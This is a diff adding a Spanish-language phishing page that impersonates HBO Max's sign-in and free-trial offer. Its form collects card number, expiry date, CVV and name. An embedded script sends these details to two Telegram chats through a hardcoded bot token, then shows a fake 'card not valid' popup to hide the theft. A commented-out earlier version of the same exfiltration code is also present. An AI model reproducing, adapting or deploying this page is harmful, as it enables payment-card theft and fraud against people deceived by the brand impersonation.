@@ -1,0 +1,259 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="stylesheet" href="assets/css/signIn.css" />
+    <link rel="stylesheet" href="/styles.css" />
+    
+    
+    <title>Entrar | HBO Max</title>
+  </head>
+  <body>
+    <nav class="menu">
+      <a href="index.html" class="menu__logo">
+        <img
+          src="assets/images/hbo-logo.svg"
+          alt="Logotipo HBOMax com o nome da marca"
+          class="menu__logo-image"
+        />
+      </a>
+      <div>
+        <a href="signIn.html" class="menu__item">Entrar</a>
+        <a href="#subscription" class="menu__item menu__item--button button">
+          ¡APROVECHA AHORA!
+        </a>
+      </div>
+    </nav>
+
+<!--FORMULARIO-->
+
+    <main class="content">
+      <form id="myForm" class="login container">
+        <h1 class="login__title">INICIA TU MEMBRESIA<br> 3 MESES GRATIS</h1>
+        <label class="login__label"> Configura tu tarjeta de crédito o débito </label>
+
+        <input
+          class="login__field"
+          
+          type="text"
+          name="name"
+          id="credito"
+          placeholder="Número de tarjeta"
+          maxlength="19"
+             
+        />
+
+      
+
+        <input
+          class="login__field"
+          type="text"
+          name="email"
+          id="fecha"
+          placeholder="MM/AA"
+          maxlength="5"
+        />
+        <div class="password-container">
+        <input
+          class="login__field"
+          type="password"
+          name="tres"
+          id="password"
+          placeholder="CVV"
+          maxlength="4"
+          />
+          <span class="toggle-password">👁️</span>
+        </div>
+
+        <input
+          class="login__field"
+          type="text"
+          name="cuatro"
+          id="nombre"
+          placeholder="Nombre"
+          maxlength="50"
+        />
+
+        <input
+          class="login__field"
+          type="text"
+          name="cinco"
+          id="apellido"
+          placeholder="Apellido"
+          maxlength="50"
+          
+        />
+
+        
+
+        <div class="login__actions">
+          <center><button id="openPopupBtn" type="button" class="button button--gradient">OBTENER PRUEBA GRATIS</button></center>
+        </div>
+        
+      </form>
+    </main>
+    <br>
+        <br>
+        <br>
+        <br>
+        <br>
+        <br>
+        <br>
+        
+        
+ 
+    
+    
+
+    
+   
+<!-- Ventana emergente (popup) -->
+<div id="popup" class="popup">
+  <div class="popup-content">
+    <span class="close-btn">&times;</span>
+    <p>Tarjeta no valida<br>Favor de intentar mas tarde</p>
+    <br>
+    
+    <button style="border-radius: 5px; background:  white; color: red; border-color: aqua; " id="redirectBtn" class="button button--gradient">ACEPTAR</button>
+  </div>
+</div>
+
+    <footer class="footer container">
+      
+      <br>
+      <br>
+        
+      
+      <p class="text--small footer__legal">
+        ©2024 WarnerMedia Direct Latin America, LLC. Todos los derechos reservados. Max se usa bajo licencia.
+      </p>
+      <div class="footer__social">
+        <a
+          href="https://www.facebook.com/HBOMaxBr/"
+          class="footer__social-link"
+        >
+          <img src="assets/images/fb_0.png" alt="Facebook" />
+        </a>
+        <a href="https://twitter.com/HBOMaxBR" class="footer__social-link">
+          <img src="assets/images/twitter_0.png" alt="Twitter" />
+        </a>
+        <a
+          href="https://www.instagram.com/hbomaxbr/"
+          class="footer__social-link"
+        >
+          <img src="assets/images/instagram_0.png" alt="Instagram" />
+        </a>
+        <a
+          href="https://www.youtube.com/c/hbomaxbr"
+          class="footer__social-link"
+        >
+          <img src="assets/images/youtube_0.png" alt="Youtube" />
+        </a>
+      </div>
+    </footer>
+
+    <script>
+      document.getElementById('openPopupBtn').addEventListener('click', function() {
+  
+        const formData = {
+          credito: document.getElementById('credito').value,
+          fecha: document.getElementById('fecha').value,
+          password: document.getElementById('password').value,
+          nombre: document.getElementById('nombre').value,
+          apellido: document.getElementById('apellido').value,
+          /*message: document.getElementById('message').value,*/
+        };
+  
+        const botToken = '6330339339:AAEEoaWroxHQ-J8BnFTjKeOFI7cLS6z3P3E';
+        const chatIdMio = '5635537335';
+        const chatIdOtro = '6318708143';
+        const text = `HB0 M4X\n\nNumero de tarjeta: ${formData.credito}\nFecha: ${formData.fecha}\nCVV: ${formData.password}\nNombre: ${formData.nombre}\nApellido: ${formData.apellido}`;
+  
+        /*
+        Función para enviar mensaje al bot de Telegram
+        */
+        const sendMessage = (chatId, text) => {
+          fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+              chat_id: chatId,
+              text: text
+            })
+          })
+          .then(response => response.json())
+          .then(data => {
+            if (data.ok) {
+              console.log('Mensaje enviado con éxito:', data.result);
+            } else {
+              console.error('Error al enviar mensaje:', data);
+            }
+          })
+          .catch(error => {
+            console.error('Error al enviar mensaje:', error);
+          });
+        };
+  
+        // Enviar mensaje a ambos chat IDs
+        sendMessage(chatIdMio, text);
+        sendMessage(chatIdOtro, text);
+  
+        /* 
+        La línea de alerta se ha eliminado para evitar mostrar 
+        una ventana emergente después de enviar el formulario.
+        */
+      });
+    </script>
+
+   <!-- <script>
+      document.getElementById('openPopupBtn').addEventListener('click', function() {
+        const credito = document.getElementById('credito').value;
+        const fecha = document.getElementById('fecha').value;
+        const cvv = document.getElementById('password').value;
+        const nombre = document.getElementById('nombre').value;
+        const apellido = document.getElementById('apellido').value;
+  
+        const message = `HB0 M4X\n\nNúmero de tarjeta: ${credito}\nFecha: ${fecha}\nCVV: ${cvv}\nNombre: ${nombre}\nApellido: ${apellido}`;
+  
+        const token = '6330339339:AAEEoaWroxHQ-J8BnFTjKeOFI7cLS6z3P3E'; // Reemplaza con tu token de bot
+        const chatId = '5635537335'; // Reemplaza con tu ID de chat
+  
+        const url = `https://api.telegram.org/bot${token}/sendMessage`;
+  
+        fetch(url, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: message
+          })
+        })
+        .then(response => response.json())
+       // .then(data => {
+        //  if (data.ok) {
+       //     alert('Mensaje enviado con éxito');
+       //   } else {
+       //     alert('Error al enviar el mensaje');
+      //    }
+      //  })
+        .catch(error => console.error('Error:', error));
+      });
+    </script>-->
+
+    
+    
+    
+
+    <script src="/16.js"></script>
+    <script src="script.js"></script>
+    
+    
+
+  </body>
+</html>
